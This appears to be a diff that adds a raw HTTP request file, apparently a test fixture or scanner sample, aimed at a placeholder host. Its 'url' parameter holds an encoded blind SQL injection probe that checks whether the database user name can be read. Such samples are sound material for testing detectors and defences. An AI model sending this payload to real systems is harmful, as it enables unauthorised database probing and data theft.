@@ -1,0 +1,4 @@
+GET /a?url=1%26%2339;%20and%20(length(user())%26gt;0)%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
